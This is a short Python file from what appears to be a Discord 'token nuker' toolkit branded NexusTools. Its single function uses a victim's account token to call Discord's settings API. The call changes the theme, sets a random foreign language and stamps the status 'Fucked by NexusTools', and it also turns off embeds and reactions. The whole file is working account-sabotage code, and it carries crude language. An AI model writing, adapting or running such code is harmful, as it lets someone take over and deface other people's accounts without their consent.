from Helper import *
from Helper.Common.utils import *
from Helper.Plugs.TokenNukerPlugs import *

def fuckAccount(token):
        new_title("Nexus Account Fucker")
        setting = {
            'theme': 'light',
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
            'custom_status':{
                'text': 'Fucked by NexusTools'
            },
            'render_embeds': False,
            'render_reactions': False
        }
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=getheaders(token), json=setting)
        print(f"{lc} Fucked his Account")
        time.sleep(2)